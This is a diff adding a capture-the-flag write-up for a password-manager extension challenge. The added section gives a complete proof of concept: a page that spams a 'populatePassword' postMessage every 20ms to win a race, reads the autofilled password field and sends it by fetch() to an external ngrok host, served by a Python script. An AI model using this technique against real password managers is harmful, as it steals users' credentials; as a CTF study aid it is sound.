@@ -64,7 +64,7 @@ To exploit the challenge, we need to implement 3 things in the PoC:
 * Exploit the Race condition by setting an interval in _milliseconds_.
 * In the `postMessage`, set the value of `url` to `http://flag`.
 
-First setup a `python` file to act as our server: 
+Before we head to the exploit work, setup a `python` file to act as our server: 
 ```python
 import http.server
 import socketserver
@@ -88,3 +88,125 @@ with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
     httpd.serve_forever()
 ```
 
+#### Input Field
+Put together an html code that as input field: 
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>POC Vulnerable website</title>
+</head>
+<body>
+    <form>
+        <input type="password"></input>
+        <script>
+          window.addEventListener('load', () => {
+                let elem = document.querySelector("input");
+                if(elem.value || true){
+                    fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
+                }
+            });
+        </script>
+    </form>
+</body>
+</html>
+```
+
+I fired up this python server, proxied through ngrok:
+```bash
+$ python3 poc.py
+```
+
+Got, the following result:
+
+<img width="946" alt="image" src="https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc">
+
+#### Race Condition
+To exploit the race condition, i simply replaced the `addEventListener` with `setInterval` having `20ms`. 
+```javascript
+setInterval(() => {
+  let elem = document.querySelector("input");
+  if(elem.value || true){
+      fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
+  }else{
+      console.log("Hello WORLD");
+  }
+}, 20);
+```
+
+#### Post Message
+Now, simply put the `postMessage` inside the callback function: 
+```javascript
+setInterval(() => {
+  window.postMessage({
+      action: "populatePassword",
+      url: "http://flag",
+      password: "YourPassword" // Replace with the desired password
+  }, "*");
+
+  let elem = document.querySelector("input");
+  if(elem.value || true){
+      fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
+  }else{
+      console.log("Hello WORLD");
+  }
+}, 20);
+```
+
+This time i fired up the server and got the flag:
+
+<img width="946" alt="image" src="https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f">
+
+## PoC
+The complete Proof of Concept:
+```python
+import http.server
+import socketserver
+
+PORT = 8000
+
+html_content = r"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>POC Vulnerable website</title>
+</head>
+<body>
+    <form>
+        <input type="password"></input>
+    </form>
+    <script>
+            setInterval(() => {
+                window.postMessage({
+                    action: "populatePassword",
+                    url: "http://flag",
+                    password: "YourPassword" // Replace with the desired password
+                }, "*");
+
+                let elem = document.querySelector("input");
+                if(elem.value || true){
+                    fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
+                }else{
+                    console.log("Hello WORLD");
+                }
+            }, 20);
+    </script>
+</body>
+</html>
+"""
+
+class MyHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html_content.encode('utf-8'))
+
+with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
+    print(f"Serving at port {PORT}")
+    httpd.serve_forever()
+```
